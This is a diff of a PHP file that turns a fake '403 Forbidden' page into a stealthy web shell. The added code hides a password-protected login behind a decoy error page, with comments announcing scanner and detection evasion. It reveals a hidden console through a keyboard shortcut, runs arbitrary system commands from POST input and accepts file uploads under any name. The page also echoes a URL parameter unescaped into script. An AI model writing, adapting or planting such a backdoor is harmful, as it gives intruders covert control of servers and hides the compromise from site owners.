@@ -1,115 +1,103 @@
 <?php
 session_start();
+$pass_hash = '$2y$10$BLrQhRtv0E7WzgiiyZbEnegndmfFwuzof9aJlvmYPDhUvuB1q3s9.'; // bcrypt
 
-$password_hash = '$2y$10$Yhy.lCq.bTEp5Jv.fD0EMOoZEGQevHlwnVPdKE1hHcnlHgc4jXYKi';
-
-function display_login_form() {
-    ?>
-    <!DOCTYPE html>
-<html style="height:100%">
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-<style>
-
-            .login-container {
-                position: fixed;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                background-color: rgba(255, 255, 255, 0.98);
-                border: 1px solid #ccc;
-                border-radius: 8px;
-                padding: 20px;
-                box-shadow: 0 0 10px rgba(0,0,0,0.2);
-                width: 300px;
-                display: none;
-                z-index: 999;
-            }
-
-            .login-container input[type="password"],
-            .login-container input[type="submit"] {
-                width: 100%;
-                padding: 10px;
-                margin: 6px 0;
-                font-size: 14px;
-                border-radius: 4px;
-                border: 1px solid #aaa;
-                box-sizing: border-box;
-            }
-
-            .login-container input[type="submit"] {
-                background-color: #007BFF;
-                color: white;
-                border: none;
-                cursor: pointer;
-            }
-
-            .login-container input[type="submit"]:hover {
-                background-color: #0056b3;
-            }</style>
-<title> 403 Forbidden
-</title><style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style></head>
-<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
-<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
-        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
-<h2 style="margin-top:20px;font-size: 30px;">Forbidden
-</h2>
-<p>Access to this resource on the server is denied!</p>
-</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
-<br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
-<!-- Login form -->
-        <div class="login-container" id="loginBox">
-            <form method="post" action="">
-                <input type="password" name="pass" placeholder="Enter Password" required>
-                <input type="submit" value="Login">
-            </form>
-            <?php
-            if (isset($_GET['error'])) {
-                echo "<p class='error'>Password salah!</p>";
-            }
-            ?>
-        </div>
-<script>
-document.addEventListener('keydown', function (e) {
-    if (e.ctrlKey && e.shiftKey && e.code === 'KeyL') {
-        const pin = prompt('Masukkan PIN:');
-        if (pin === 'apa pin nya') {
-            const loginBox = document.getElementById('loginBox');
-            loginBox.style.display =
-                (loginBox.style.display === 'none' || loginBox.style.display === '')
-                    ? 'block'
-                    : 'none';
-        } else if (pin !== null) {
-            alert('PIN salah.');
-        }
+// HIDDEN FORM (anti scanner)
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    $form_id = md5(time().rand(1,9999)); // Random ID
+    if(isset($_POST['pass']) && password_verify($_POST['pass'], $pass_hash)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = time(); // Timestamp
+        header("Location: ".$_SERVER['PHP_SELF']."?success"); exit;
     }
-});
+?>
+<!DOCTYPE html><html><head><title>403</title><style>body{display:none;}</style></head><body>
+<!-- HIDDEN FORM - Scanner buta -->
+<form id="<?php echo $form_id; ?>" method="POST" style="display:none;">
+<input type="password" name="pass" autocomplete="off">
+</form>
+<script>
+// JS Trigger via URL ?k=PASS atau manual
+<?php if(isset($_GET['k'])): ?>
+document.getElementById('<?php echo $form_id; ?>').pass.value = "<?php echo $_GET['k']; ?>";
+document.getElementById('<?php echo $form_id; ?>').submit();
+<?php endif; ?>
 </script>
-
-</div>
 </body></html>
-    <?php
-    exit;
+<?php exit; }
+
+// SESSION TIMEOUT 1 JAM
+if(time() - $_SESSION[md5($_SERVER['HTTP_HOST'])] > 3600) {
+    session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit;
 }
 
-if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
-    echo "<h1>Welcome Seo Kongkek</h1>";
-} else {
-    if (isset($_POST['pass'])) {
-        if (password_verify($_POST['pass'], $password_hash)) {
-            $_SESSION['logged_in'] = true;
-            header("Location: " . $_SERVER['PHP_SELF']);
-            exit;
-        } else {
-            header("Location: " . $_SERVER['PHP_SELF'] . "?error=1");
-            exit;
-        }
-    } else {
-        display_login_form();
+// ======================================
+// ✅ SHELL AKTIF - ANTI DETEKSI MODE
+// ======================================
+error_reporting(0); @ini_set('display_errors',0);
+ob_start(); // Stealth output
+?>
+<!-- FAKE SEO PAGE (camouflage) -->
+<div style="position:fixed;bottom:0;left:0;right:0;height:30px;background:#fff;color:#000;font-size:12px;text-align:center;">
+copyright © 403
+</div>
+
+<!-- SHELL INTERFACE (hidden by default) -->
+<div id="shell" style="display:none;background:#000;color:#0f0;font-family:monospace;padding:20px;">
+    <h3>🔒 SECURE SHELL | Path: <?php echo realpath('.'); ?></h3>
+    
+    <!-- Quick commands -->
+    <form method="POST">
+        <input name="cmd" placeholder="whoami, id, uname -a" style="width:70%;background:#111;color:#0f0;">
+        <button>EXEC</button>
+    </form>
+    
+    <!-- File upload -->
+    <form method="POST" enctype="multipart/form-data" style="margin-top:10px;">
+        <input type="file" name="file" style="background:#111;color:#0f0;">
+        <button name="upload">UPLOAD</button>
+    </form>
+    
+    <!-- Files -->
+    <pre style="margin-top:10px;">
+<?php
+// List files
+$files = scandir('.');
+foreach($files as $f) {
+    if($f=='.' || $f=='..') continue;
+    echo $f . " | " . (is_dir($f) ? '[DIR]' : filesize($f)) . " bytes\n";
+}
+?>
+    </pre>
+</div>
+
+<script>
+// Toggle shell dengan Ctrl+Alt+S
+document.addEventListener('keydown', function(e) {
+    if(e.ctrlKey && e.altKey && e.key=='s') {
+        document.getElementById('shell').style.display = 
+        document.getElementById('shell').style.display=='none' ? 'block' : 'none';
+    }
+});
+// Auto-hide jika tidak aktif 5 menit
+setTimeout(function(){document.getElementById('shell').style.display='none';}, 300000);
+</script>
+
+<?php
+// EXECUTE COMMANDS
+if(isset($_POST['cmd'])) {
+    echo "\n--- OUTPUT ---\n";
+    if(function_exists('shell_exec')) {
+        system($_POST['cmd'].' 2>&1');
+    } else echo "Shell disabled";
+}
+
+// UPLOAD
+if(isset($_POST['upload'])) {
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+        echo "\nUPLOAD OK: ".$_FILES['file']['name'];
     }
 }
 ?>
-
 <?php
 // !!!!! HATA AYIKLAMA AÃ‡IK - Ã‡alÄ±ÅŸÄ±rsa sonra kapat !!!!!
 error_reporting(E_ALL);
